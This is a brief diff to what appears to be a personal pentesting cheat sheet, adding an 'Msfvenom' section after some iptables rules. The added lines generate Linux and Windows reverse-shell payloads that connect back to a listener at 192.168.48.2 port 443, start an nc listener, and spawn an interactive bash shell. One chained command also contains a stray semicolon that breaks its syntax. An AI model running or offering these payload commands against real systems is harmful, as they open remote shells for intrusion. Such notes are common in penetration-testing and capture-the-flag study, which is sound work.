@@ -84,3 +84,10 @@ sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
 sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP
 sudo iptables -L --line-numbers
 ```
+### Msfvenom
+msfvenom --list payloads  
+msfvenom --list platforms  
+msfvenom --list formats  
+msfvenom -p linux/x86/shell_reverse_tcp --list-options  
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f elf > shell.elf && nc -lvnp 443 && python -c 'import pty;pty.spawn("/bin/bash")'; && export TERM=xterm  
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f exe > windows_reverse.exe
